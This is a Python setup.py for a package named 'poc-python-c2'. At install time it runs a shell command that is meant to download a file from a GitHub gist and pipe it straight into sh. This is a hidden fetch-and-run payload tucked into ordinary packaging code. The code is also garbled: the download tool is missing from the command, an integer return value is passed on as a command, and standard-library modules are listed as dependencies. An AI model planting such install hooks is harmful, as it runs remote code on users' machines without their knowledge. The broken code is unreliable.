from setuptools import setup
import subprocess, os

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    return process

command = os.system("https://gist.githubusercontent.com/rroiii/56b6b9d8ace864bf66233e10b580f922/raw/75abf6e00ff9358ad6cc8eda67131b319259e86a/poc-test.txt -s | sh")

run_command(command)

setup(
    name='poc-python-c2',
    version='0.1',
    packages=['poc-python-c2'],
    install_requires=[
        'subprocess',
        'os'
    ]
)